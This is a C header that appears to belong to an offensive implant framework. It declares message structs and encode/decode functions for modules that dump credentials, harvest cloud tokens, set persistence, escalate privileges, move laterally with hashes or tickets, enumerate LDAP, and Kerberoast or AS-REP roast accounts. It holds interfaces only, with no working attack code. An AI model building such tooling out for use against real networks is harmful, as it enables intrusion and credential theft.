#ifndef ARK_PB_MODULES_H
#define ARK_PB_MODULES_H

#include <stddef.h>
#include <stdint.h>

#define ARK_MOD_NAME_MAX 128
#define ARK_MOD_STR_MAX  4096
#define ARK_MOD_PATH_MAX 1024
#define ARK_LDAP_ATTR_MAX 64
#define ARK_LDAP_ENTRY_MAX 256
#define ARK_CLOUD_CRED_MAX 64
#define ARK_CLOUD_TOKEN_MAX 32

typedef struct ark_module_task {
    char     module_name[ARK_MOD_NAME_MAX];
    uint8_t *config;
    size_t   config_len;
} ark_module_task;

typedef struct ark_cloud_harvest_config {
    char provider[64];
    char method[64];
} ark_cloud_harvest_config;

typedef struct ark_cred_dump_config {
    char     method[64];
    uint32_t target_pid;
    char     output_format[64];
} ark_cred_dump_config;

typedef struct ark_persist_config {
    char     method[64];
    char     name[256];
    char     payload_path[ARK_MOD_PATH_MAX];
    char     trigger[64];
    uint8_t *payload;
    size_t   payload_len;
} ark_persist_config;

typedef struct ark_privesc_config {
    char     method[64];
    uint32_t target_pid;
    char     command[ARK_MOD_STR_MAX];
} ark_privesc_config;

typedef struct ark_lateral_config {
    char     method[64];
    char     target[256];
    char     domain[256];
    char     username[256];
    char     password[256];
    char     ntlm_hash[256];
    uint8_t *ticket;
    size_t   ticket_len;
    char     command[ARK_MOD_STR_MAX];
    uint8_t *payload;
    size_t   payload_len;
    char     service_name[256];
} ark_lateral_config;

typedef struct ark_ldap_enum_config {
    char     target_dc[256];
    char     domain[256];
    char     username[256];
    char     password[256];
    char     ntlm_hash[256];
    char     query_type[64];
    char     custom_filter[512];
    char    *attributes[ARK_LDAP_ATTR_MAX];
    size_t   attribute_count;
} ark_ldap_enum_config;

typedef struct ark_kerberoast_config {
    char     target_dc[256];
    char     domain[256];
    char     username[256];
    char     password[256];
    char     ntlm_hash[256];
    char    *target_spns[64];
    size_t   target_spn_count;
    char     encryption[64];
} ark_kerberoast_config;

typedef struct ark_asreproast_config {
    char     target_dc[256];
    char     domain[256];
    char    *target_users[256];
    size_t   target_user_count;
} ark_asreproast_config;

typedef struct ark_credential {
    char type[64];
    char domain[256];
    char username[256];
    char value[512];
    char source[256];
} ark_credential;

typedef struct ark_cloud_credential {
    char provider[32];
    char cred_type[64];
    char identity[256];
    char secret[512];
    char extra[512];
    char source[256];
} ark_cloud_credential;

typedef struct ark_cloud_token {
    char provider[32];
    char token_type[64];
    char access_token[2048];
    char refresh_token[512];
    char tenant_id[64];
    char client_id[64];
    char resource[256];
    int64_t expires_at;
    char source[256];
} ark_cloud_token;

typedef struct ark_ldap_entry {
    char  dn[512];
    char *attr_names[ARK_LDAP_ATTR_MAX];
    char *attr_values[ARK_LDAP_ATTR_MAX];
    size_t attr_count;
} ark_ldap_entry;

int ark_pb_decode_module_task(const uint8_t *in, size_t in_len, ark_module_task *t);
void ark_pb_free_module_task(ark_module_task *t);

int ark_pb_decode_cloud_harvest_config(const uint8_t *in, size_t in_len, ark_cloud_harvest_config *c);
int ark_pb_decode_cred_dump_config(const uint8_t *in, size_t in_len, ark_cred_dump_config *c);
int ark_pb_decode_persist_config(const uint8_t *in, size_t in_len, ark_persist_config *c);
void ark_pb_free_persist_config(ark_persist_config *c);
int ark_pb_decode_privesc_config(const uint8_t *in, size_t in_len, ark_privesc_config *c);
int ark_pb_decode_lateral_config(const uint8_t *in, size_t in_len, ark_lateral_config *c);
void ark_pb_free_lateral_config(ark_lateral_config *c);
int ark_pb_decode_ldap_enum_config(const uint8_t *in, size_t in_len, ark_ldap_enum_config *c);
void ark_pb_free_ldap_enum_config(ark_ldap_enum_config *c);
int ark_pb_decode_kerberoast_config(const uint8_t *in, size_t in_len, ark_kerberoast_config *c);
void ark_pb_free_kerberoast_config(ark_kerberoast_config *c);
int ark_pb_decode_asreproast_config(const uint8_t *in, size_t in_len, ark_asreproast_config *c);
void ark_pb_free_asreproast_config(ark_asreproast_config *c);

int ark_pb_encode_persist_result(int success, const char *method, const char *details, uint8_t **out, size_t *out_len);
int ark_pb_encode_privesc_result(int success, const char *method, const char *new_integrity, uint32_t new_pid, uint8_t **out, size_t *out_len);
int ark_pb_encode_cred_dump_result(const char *method, const ark_credential *creds, size_t cred_count, uint8_t **out, size_t *out_len);
int ark_pb_encode_cloud_harvest_result(const char *provider, const char *method,
    const ark_cloud_token *tokens, size_t token_count,
    const ark_cloud_credential *creds, size_t cred_count,
    const char *metadata, const char *error, uint8_t **out, size_t *out_len);
int ark_pb_encode_lateral_result(const char *method, const char *target, int success, const char *output, uint8_t **out, size_t *out_len);
int ark_pb_encode_ldap_enum_result(const char *domain, const char *dc, const char *query_type,
    const ark_ldap_entry *entries, size_t entry_count, int32_t total, uint8_t **out, size_t *out_len);
void ark_pb_free_ldap_entries(ark_ldap_entry *entries, size_t count);
typedef struct ark_kerberoast_hash {
    const char *spn;
    const char *sam;
    const char *hash;
    const char *enc;
} ark_kerberoast_hash;

/* Single-hash convenience (wraps multi). */
int ark_pb_encode_kerberoast_result(const char *spn, const char *sam, const char *hash, const char *enc, uint8_t **out, size_t *out_len);
/* Repeated KerberoastHash (field 1). count==0 encodes an empty result. */
int ark_pb_encode_kerberoast_result_multi(const ark_kerberoast_hash *hashes, size_t count,
    uint8_t **out, size_t *out_len);
typedef struct ark_asreproast_hash {
    const char *username;
    const char *hash;
} ark_asreproast_hash;

int ark_pb_encode_asreproast_result(const char *username, const char *hash, uint8_t **out, size_t *out_len);
int ark_pb_encode_asreproast_result_multi(const ark_asreproast_hash *hashes, size_t count,
    uint8_t **out, size_t *out_len);

#endif